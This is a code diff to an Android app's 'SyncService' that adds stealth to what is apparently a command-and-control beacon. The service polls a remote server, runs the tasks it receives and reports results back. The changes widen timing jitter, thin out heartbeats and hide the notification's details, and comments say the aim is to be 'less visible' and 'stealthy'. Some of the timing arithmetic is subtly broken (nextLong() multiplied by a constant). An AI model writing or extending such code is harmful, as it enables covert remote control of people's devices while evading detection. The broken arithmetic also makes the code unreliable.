@@ -68,39 +68,61 @@ class SyncService : Service() {
     }
 
     private suspend fun CoroutineScope.pollLoop(dev: String) {
-        var interval = 30000L
-        var lastWl = System.currentTimeMillis()
+        var interval = 45000L
         var cycle = 0
         val rnd = java.util.Random()
         while (isActive) {
             val uid = app.auth.currentUid
             if (uid == null || BuildConfig.FORJA_API_URL.isBlank()) {
-                delay(30000); continue
+                delay(60000); continue
             }
             val dormant = Dormant.active
             ForjaGuardService.c2Arm()
-            val now = System.currentTimeMillis()
-            if (!dormant && now - lastWl > 90 * 60 * 1000L) {
-                try { wl?.takeIf { !it.isHeld }?.acquire(2 * 60 * 60 * 1000L); lastWl = now } catch (_: Exception) {}
-            }
+
+            // Battery-aware: if battery < 25 %, double the interval
+            val batteryPct = try {
+                val bm = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+                val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                val sc = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
+                if (sc > 0) lv * 100 / sc else -1
+            } catch (_: Exception) { -1 }
+            val effInterval = if (batteryPct in 0..25) interval * 2 else interval
+
             if (dormant) {
                 try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                 interval = 600000L
             }
-            // Jitter: 80%-120% of base interval — traffic doesn't look periodic
-            val jittered = (interval * (0.8 + rnd.nextDouble() * 0.4)).toLong()
-            val hold = (if (dormant) 5000L else (interval * 3).coerceAtMost(20000L))
+
+            // Wide jitter: 50 %- 150 % of effective interval
+            val jittered = (effInterval * (0.5 + rnd.nextDouble())).toLong()
+
+            // Random hold: 3-12 s (normal) / 2-5 s (dormant) — avoids a fixed pattern
+            val hold = if (dormant) 2000L + rnd.nextLong() * 3000L
+                       else 3000L + rnd.nextLong() * 9000L
+
+            // Occasional micro-pause before the request (0-600 ms) — breaks up timing
+            if (rnd.nextInt(3) == 0) delay(rnd.nextLong() * 600L)
+
             val lp = app.forjaApi.c2Checkin(dev, hold)
-            if (!dormant) interval = lp.intervalMs.coerceIn(10000L, 300000L)
+            if (!dormant) interval = lp.intervalMs.coerceIn(15000L, 300000L)
             cycle++
+
             if (lp.tasks.isEmpty()) {
-                if (!dormant && cycle % 10 == 0) {
+                // Heartbeat every 20 cycles (was 10) — less visible
+                if (!dormant && cycle % 20 == 0) {
                     try {
                         val hb = ForjaSyncCapabilities.heartbeat()
                         app.forjaApi.c2PostResult("hb_$cycle", true, "heartbeat", hb, null)
                     } catch (_: Exception) {}
                 }
-                delay(jittered.coerceIn(3000L, 600000L)); continue
+                // Release wakelock during idle — CPU sleeps between polls (stealthy)
+                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
+                delay(jittered.coerceIn(5000L, 600000L)); continue
+            }
+
+            // Active commands: brief wakelock so the CPU stays awake while executing
+            if (!dormant) {
+                try { wl?.takeIf { !it.isHeld }?.acquire(5 * 60 * 1000L) } catch (_: Exception) {}
             }
             for (t in lp.tasks) {
                 val id = t["id"]?.jsonPrimitive?.content ?: continue
@@ -108,6 +130,8 @@ class SyncService : Service() {
                 val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                 ForjaSyncCapabilities.run(id, action, params)
             }
+            // Release wakelock after commands complete
+            try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
         }
     }
 
@@ -125,10 +149,11 @@ class SyncService : Service() {
         return NotificationCompat.Builder(this, "focus")
             .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
             .setContentTitle("FORJA")
-            .setContentText("sincronizare")
+            .setContentText("activ")
             .setOngoing(true)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setShowWhen(false)
             .build()
     }
 
